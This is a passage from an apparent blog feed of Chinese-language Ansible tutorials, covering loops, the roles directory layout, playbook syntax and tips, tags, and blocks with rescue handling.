&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[root@localhost playbook]$vim loop-useradd.yaml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;---&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- hosts: all&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  tasks:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    - name: add several users&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      user:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         name: &amp;quot;&amp;#123;&amp;#123; item &amp;#125;&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         state: present&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         groups: &amp;quot;wheel&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         - testuser1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         - testuser2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible-Roles</title>
    <link href="https://jesse.top/2018/08/27/Ansible/Ansible-Roles/"/>
    <id>https://jesse.top/2018/08/27/Ansible/Ansible-Roles/</id>
    <published>2018-08-27T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible-Roles"><a href="#Ansible-Roles" class="headerlink" title="Ansible-Roles"></a>Ansible-Roles</h2><p>  对于中小型项目来说playbook结合include就足以胜任,清晰,有效的完成自动化部署工作了.但是如果是对于大型的项目,几十个playbook来说,可能会造成文件繁多,目录结构不清晰,命名不规范,以及后期维护成本大大升高.</p><p>ansible的roles功能就是为了解决这个问题应运而生.roles字面意思是”角色”,可以理解为各个不同模块功能的关联集合.roles主要包括以下功能模块:var_files,tasks,handlers,templates,files,等等</p><p>但是需要注意的是,为了规范和维护期间.roles应该定义一个清晰,明确的目录结构以及文件名.不可随意更改.</p><a id="more"></a><hr><h4 id="roles目录结构"><a href="#roles目录结构" class="headerlink" title="roles目录结构"></a>roles目录结构</h4><p>常见的roles任务包含下列目录结构:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">playbook_role.yml #role的playbook入口</span><br><span class="line">roles/</span><br><span class="line">  role_name/</span><br><span class="line">      tasks/</span><br><span class="line">      files/</span><br><span class="line">      templates/</span><br><span class="line">      handlers/</span><br><span class="line">      vars/</span><br><span class="line">   role_name2/</span><br><span class="line">      tasks/</span><br><span class="line">      files/</span><br><span class="line">      templates/</span><br><span class="line">      handlers/</span><br><span class="line">      vars/</span><br></pre></td></tr></table></figure><p>关于roles的目录结构有以下注意事项:</p><ul><li>一个role必须包含tasks目录.</li><li>以上的目录结构各代表不同的功能组件,各司其职,不可随意更改目录名.</li><li>每个目录下需要创建main.yml文件,作为改功能组件的入口.有点类似于Python的init.py文件</li></ul><p>下面解释了每个目录的功能含义:</p><ul><li>tasks: 包含一系列的Playbook文件,也就是roles要执行的一系列具体tasks</li><li>handlers: 包含inotify需要执行的handlers任务</li><li>defaults: roles的默认变量</li><li>vars: 变量文件</li><li>files: 文件</li><li>templates: 模板文件</li><li>meta: 元数据</li></ul><hr><h4 id="main-yml文件"><a href="#main-yml文件" class="headerlink" title="main.yml文件"></a>main.yml文件</h4><p>main.yml文件是各目录代表的功能模块的入口,main.yml文件可以通过include或者import_task选项导入同目录下的其他yml文件(也就是其他playbook).例如下面的tasks/main.yml文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#下面是main.yml文件内容.main.yml文件作为tasks的入口,导入了同目录下的redhat和debian2个playbook</span><br><span class="line"># roles/example/tasks/main.yml</span><br><span class="line">- name: added in 2.4, previously you used &apos;include&apos;</span><br><span class="line">  import_tasks: redhat.yml</span><br><span class="line">  when: ansible_os_platform|lower == &apos;redhat&apos;</span><br><span class="line">- import_tasks: debian.yml</span><br><span class="line">  when: ansible_os_platform|lower == &apos;debian&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#下面是tasks/redhat.yml文件,其实就是个独立的playbook</span><br><span class="line"># roles/example/tasks/redhat.yml</span><br><span class="line">- yum:</span><br><span class="line">    name: &quot;httpd&quot;</span><br><span class="line">    state: present</span><br><span class="line"></span><br><span class="line">#同理,下面是debian.yml文件</span><br><span class="line"># roles/example/tasks/debian.yml</span><br><span class="line">- apt:</span><br><span class="line">    name: &quot;apache2&quot;</span><br><span class="line">    state: present</span><br></pre></td></tr></table></figure><h3 id="运行roles"><a href="#运行roles" class="headerlink" title="运行roles"></a>运行roles</h3><p>运行roles非常简单,只需要在最外层的Playbook上使用roles关键字,指定运行哪些roles目录即可:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: webservers</span><br><span class="line">  roles:</span><br><span class="line">     - common</span><br><span class="line">     - webservers</span><br></pre></td></tr></table></figure><p>一旦运行这个playbook,那么针对上面这2个roles(common和webservers),都会自动执行下面文件:</p><ul><li>roles/{common,webservers}/tasks/main.yml (如果该文件存在)</li><li>roles/{common,webservers}/vars/main.yml .(如果该文件存在)</li><li>roles/{common,webservers}/default/main.yml (如果该文件存在)</li><li>roles/{common,webservers}/handlers/main.yml  (如果该文件存在,且tasks目录下的playbook调用了handlers)</li><li>…….</li></ul><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible-Roles&quot;&gt;&lt;a href=&quot;#Ansible-Roles&quot; class=&quot;headerlink&quot; title=&quot;Ansible-Roles&quot;&gt;&lt;/a&gt;Ansible-Roles&lt;/h2&gt;&lt;p&gt;  对于中小型项目来说playbook结合include就足以胜任,清晰,有效的完成自动化部署工作了.但是如果是对于大型的项目,几十个playbook来说,可能会造成文件繁多,目录结构不清晰,命名不规范,以及后期维护成本大大升高.&lt;/p&gt;
&lt;p&gt;ansible的roles功能就是为了解决这个问题应运而生.roles字面意思是”角色”,可以理解为各个不同模块功能的关联集合.roles主要包括以下功能模块:var_files,tasks,handlers,templates,files,等等&lt;/p&gt;
&lt;p&gt;但是需要注意的是,为了规范和维护期间.roles应该定义一个清晰,明确的目录结构以及文件名.不可随意更改.&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible-Playbook</title>
    <link href="https://jesse.top/2018/08/26/Ansible/Ansible%E7%9A%84Playbook%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7/"/>
    <id>https://jesse.top/2018/08/26/Ansible/Ansible的Playbook介绍以及技巧/</id>
    <published>2018-08-26T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible的Playbook介绍以及技巧"><a href="#Ansible的Playbook介绍以及技巧" class="headerlink" title="Ansible的Playbook介绍以及技巧"></a>Ansible的Playbook介绍以及技巧</h2><p>playbook的格式是YAML.以下是一个playbook的范例:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: webservers</span><br><span class="line">  vars:</span><br><span class="line">    http_port: 80</span><br><span class="line">    max_clients: 200</span><br><span class="line">  remote_user: root</span><br><span class="line">  tasks:</span><br><span class="line">  - name: ensure apache is at the latest version</span><br><span class="line">    yum: pkg=httpd state=latest</span><br><span class="line">  - name: write the apache config file</span><br><span class="line">    template: src=/srv/httpd.j2 dest=/etc/httpd.conf</span><br><span class="line">    notify:</span><br><span class="line">    - restart apache</span><br><span class="line">  - name: ensure apache is running</span><br><span class="line">    service: name=httpd state=started</span><br><span class="line">  handlers:</span><br><span class="line">    - name: restart apache</span><br><span class="line">      service: name=httpd state=restarted</span><br></pre></td></tr></table></figure><p>通过上面的范例可以总结出playbook的基础语法和注意点:</p><ul><li>playbook的最顶部以—3个横杠开头</li><li>相同元素以-减号排列,在缩进中空格的数量不重要,但是相同阶层的元素要左对齐(不能使用tab字符)</li><li>可以不使用双引号来括住字符串</li><li>name是任务的描述,不是必需.但是为了playbook的易读性,建议name要有.一个name只能包含一个task.</li></ul><h3 id="playbook的使用技巧"><a href="#playbook的使用技巧" class="headerlink" title="playbook的使用技巧"></a>playbook的使用技巧</h3><h4 id="sudo用户"><a href="#sudo用户" class="headerlink" title="sudo用户"></a>sudo用户</h4><ul><li><p>remote_user表示playbook允许时以哪个用户运行,如果加上sudo:yes.表示以sudo方式运行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- hosts: webservers</span><br><span class="line">  remote_user: yourname</span><br><span class="line">  sudo: yes</span><br></pre></td></tr></table></figure><p>如果是仅仅在一个task中使用sudo.而不是在整个playbook中使用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: webservers</span><br><span class="line">  remote_user: yourname</span><br><span class="line">  tasks:</span><br><span class="line">    - service: name=nginx state=started</span><br><span class="line">      sudo: yes</span><br></pre></td></tr></table></figure></li></ul><h4 id="模块和命令换行"><a href="#模块和命令换行" class="headerlink" title="模块和命令换行"></a>模块和命令换行</h4><ul><li><p>k/v键值对(模块和命令)可以在写在一行,用:冒号隔开,也可以用&gt; 符号换行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- name: test</span><br><span class="line">  command: &gt; </span><br><span class="line">  ls /home/</span><br></pre></td></tr></table></figure><p>如果命令行太长,可以用空格或者缩进换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: Copy ansible inventory file to client</span><br><span class="line">    copy: src=/etc/ansible/hosts dest=/etc/ansible/hosts</span><br><span class="line">            owner=root group=root mode=0644</span><br></pre></td></tr></table></figure></li></ul><h4 id="调用变量"><a href="#调用变量" class="headerlink" title="调用变量"></a>调用变量</h4><ul><li><p>命令可以用变量,变量的引用方式为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: create a virtual host file for &#123;&#123; vhost &#125;&#125;</span><br><span class="line">    template: src=somefile.j2 dest=/etc/httpd/conf.d/&#123;&#123; vhost &#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="忽略错误-继续执行后续的task"><a href="#忽略错误-继续执行后续的task" class="headerlink" title="忽略错误,继续执行后续的task"></a>忽略错误,继续执行后续的task</h4><ul><li><p>忽略错误,继续执行下一个task..默认情况下playbook如果执行命令失败就会终止整个Playbook的执行.使用ignore_erros参数可以在执行某个task失败时,自动忽略继续执行下一个task:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: run this command and ignore the result</span><br><span class="line">    shell: /usr/bin/somecommand</span><br><span class="line">    ignore_errors: True</span><br></pre></td></tr></table></figure><p>或者采用下列方式.如果somecommand失败,则执行某个一定为true的命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: run this command and ignore the result</span><br><span class="line">    shell: /usr/bin/somecommand || /bin/true</span><br></pre></td></tr></table></figure></li></ul><h4 id="limit限定执行的主机范围"><a href="#limit限定执行的主机范围" class="headerlink" title="limit限定执行的主机范围"></a>limit限定执行的主机范围</h4><ul><li><p>limit参数 限定执行的主机范围.例如下面的例子限定在centos7这台主机上执行.当然也可以限定在一个组内的主机上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --limit centos7</span><br></pre></td></tr></table></figure></li><li><p>–list-hosts参数查看一个Playbook影响的所有主机.例如下列命令可以看到Playbook将在哪些主机上执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --list-hosts</span><br><span class="line"></span><br><span class="line">playbook: test.yaml</span><br><span class="line"></span><br><span class="line">  play #1 (all): allTAGS: []</span><br><span class="line">    pattern: [&apos;all&apos;]</span><br><span class="line">    hosts (3):</span><br><span class="line">      centos6</span><br><span class="line">      centos7</span><br><span class="line">      web</span><br></pre></td></tr></table></figure></li></ul><h4 id="检测执行过程"><a href="#检测执行过程" class="headerlink" title="检测执行过程"></a>检测执行过程</h4><ul><li><p>– check 检测模式,playbook定义的任务将在每台远程主机上进行检测,但是并不真正执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --check</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>list–tasks有相似的作用,它列出了playbook的task任务安排:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt; [root@localhost playbook]$ansible-playbook --list-tasks nginx.yaml</span><br><span class="line">&gt;  [WARNING]: Could not match supplied host pattern, ignoring: 10.0.4.240</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; playbook: nginx.yaml</span><br><span class="line">&gt; </span><br><span class="line">&gt;   play #1 (10.0.4.240): 10.0.4.240TAGS: []</span><br><span class="line">&gt;     tasks:</span><br><span class="line">&gt;       check if there is nginx repo on serverTAGS: []</span><br><span class="line">&gt;       install nginx yum repo,if there is no nginx repoTAGS: []</span><br><span class="line">&gt;       install nginxTAGS: []</span><br><span class="line">&gt;       create nginx document dirTAGS: []</span><br><span class="line">&gt;       create nginx log dirTAGS: []</span><br><span class="line">&gt;       copy nginx configure fileTAGS: []</span><br><span class="line">&gt;       copy nginx web fileTAGS: []</span><br><span class="line">&gt;       start nginxTAGS: []</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="执行并发数"><a href="#执行并发数" class="headerlink" title="执行并发数"></a>执行并发数</h4><ul><li>–forks=数字.指定并发执行的任务数.默认是5.调高这个值可以加快ansible执行效率</li></ul><h4 id="debug显示执行结果"><a href="#debug显示执行结果" class="headerlink" title="debug显示执行结果"></a>debug显示执行结果</h4><ul><li>显示命令的执行返回结果.Asible默认并不会显示命令的执行结果,通过debug模块可以输出命令的执行结果.例如:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line">  - hosts: all</span><br><span class="line">    remote_user: root</span><br><span class="line">    tasks:</span><br><span class="line">      - name: get variables</span><br><span class="line">        shell: cat /etc/redhat-release</span><br><span class="line">        register: foo</span><br><span class="line">      - name: print variable</span><br><span class="line">        debug: msg=&quot;the vairables is &#123;&#123; foo.stdout &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --limit centos7</span><br><span class="line"></span><br><span class="line">PLAY [all] **********************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] **********************************************************************************************************************</span><br><span class="line">ok: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [get variables] ************************************************************************************************************************</span><br><span class="line">changed: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [print variable] ***********************************************************************************************************************</span><br><span class="line">ok: [centos7] =&gt; &#123;</span><br><span class="line">    &quot;msg&quot;: &quot;the vairables is CentOS Linux release 7.2.1511 (Core) &quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PLAY RECAP **********************************************************************************************************************************</span><br><span class="line">centos7                    : ok=3    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><p>或者使用下面的语句.结果是一样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">  - hosts: all</span><br><span class="line">    remote_user: root</span><br><span class="line">    tasks:</span><br><span class="line">      - name: get variables</span><br><span class="line">        shell: cat /etc/redhat-release</span><br><span class="line">        register: foo</span><br><span class="line">      - name: print variable</span><br><span class="line">        #debug: msg=&quot;the vairables is &#123;&#123; foo.stdout &#125;&#125;&quot;</span><br><span class="line">        debug: var=foo.stdout</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible ansible]$ansible-playbook test.yaml --limit centos7</span><br><span class="line"></span><br><span class="line">PLAY [all] **********************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] **********************************************************************************************************************</span><br><span class="line">ok: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [get variables] ************************************************************************************************************************</span><br><span class="line">changed: [centos7]</span><br><span class="line"></span><br><span class="line">TASK [print variable] ***********************************************************************************************************************</span><br><span class="line">ok: [centos7] =&gt; &#123;</span><br><span class="line">    &quot;foo.stdout&quot;: &quot;CentOS Linux release 7.2.1511 (Core) &quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PLAY RECAP **********************************************************************************************************************************</span><br><span class="line">centos7                    : ok=3    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible的Playbook介绍以及技巧&quot;&gt;&lt;a href=&quot;#Ansible的Playbook介绍以及技巧&quot; class=&quot;headerlink&quot; title=&quot;Ansible的Playbook介绍以及技巧&quot;&gt;&lt;/a&gt;Ansible的Playbook介绍以及技巧&lt;/h2&gt;&lt;p&gt;playbook的格式是YAML.以下是一个playbook的范例:&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible playbook高级特性</title>
    <link href="https://jesse.top/2018/08/26/Ansible/playbook%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/"/>
    <id>https://jesse.top/2018/08/26/Ansible/playbook高级特性/</id>
    <published>2018-08-26T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="playbook高级特性"><a href="#playbook高级特性" class="headerlink" title="playbook高级特性"></a>playbook高级特性</h2><h3 id="tags-标签"><a href="#tags-标签" class="headerlink" title="tags 标签"></a>tags 标签</h3><p>给task打上标签可以允许playbook执行的时候使用–tags选项只执行某个task或者–skip-tags选项不执行某个task.例如:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line"></span><br><span class="line">    - yum:</span><br><span class="line">        name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">        state: installed</span><br><span class="line">      loop:</span><br><span class="line">         - httpd</span><br><span class="line">         - memcached</span><br><span class="line">      tags:</span><br><span class="line">         - packages</span><br><span class="line"></span><br><span class="line">    - template:</span><br><span class="line">        src: templates/src.j2</span><br><span class="line">        dest: /etc/foo.conf</span><br><span class="line">      tags:</span><br><span class="line">         - configuration</span><br></pre></td></tr></table></figure><p>如果只想执行”configuration”和”packags”标签的task,只需要执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook example.yml --tags &quot;configuration,packages&quot;</span><br></pre></td></tr></table></figure><p>或者如果想跳过configuration的task.只需要–skip-tags选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook example.yml --skip-tags  &quot;configuration&quot;</span><br></pre></td></tr></table></figure><blockquote><p>tags标签可以复用.可以为多个task打上同一个tags</p></blockquote><h4 id="tags继承性"><a href="#tags继承性" class="headerlink" title="tags继承性"></a>tags继承性</h4><p>tags可以定义在整个playbook中,或者roles中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- hosts: all</span><br><span class="line">  tags:</span><br><span class="line">    - bar</span><br><span class="line">  tasks:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">- hosts: all</span><br><span class="line">  tags: [&apos;foo&apos;]</span><br><span class="line">  tasks:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">roles:</span><br><span class="line">  - role: webserver</span><br><span class="line">    vars:</span><br><span class="line">      port: 5000</span><br><span class="line">    tags: [ &apos;web&apos;, &apos;foo&apos; ]</span><br></pre></td></tr></table></figure><hr><h3 id="Blocks-块功能"><a href="#Blocks-块功能" class="headerlink" title="Blocks 块功能"></a>Blocks 块功能</h3><p>Blocks块可以允许将一个或多个task归为一组,例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: Install Apache</span><br><span class="line">    block:</span><br><span class="line">      - yum:</span><br><span class="line">          name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">          state: installed</span><br><span class="line">        with_items:</span><br><span class="line">          - httpd</span><br><span class="line">          - memcached</span><br><span class="line">      - template:</span><br><span class="line">          src: templates/src.j2</span><br><span class="line">          dest: /etc/foo.conf</span><br><span class="line">      - service:</span><br><span class="line">          name: bar</span><br><span class="line">          state: started</span><br><span class="line">          enabled: True</span><br><span class="line">    when: ansible_distribution == &apos;CentOS&apos;</span><br><span class="line">    become: true</span><br><span class="line">    become_user: root</span><br></pre></td></tr></table></figure><p>这些task都被放置与一个block中,而且在block中定义了一个whn条件判断语句.这样就不用再每个task中都定义一个相同的when语句.</p><h4 id="block块处理异常任务"><a href="#block块处理异常任务" class="headerlink" title="block块处理异常任务."></a>block块处理异常任务.</h4><p>block可以用来处理任务的异常.有点类似于python编程语句的try exception…finally语句捕获异常.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">- name: Attempt and graceful roll back demo</span><br><span class="line">  block:</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I execute normally&apos;</span><br><span class="line">    - command: /bin/false</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I never execute, due to the above task failing&apos;</span><br><span class="line">  rescue:</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I caught an error&apos;</span><br><span class="line">    - command: /bin/false</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I also never execute :-(&apos;</span><br><span 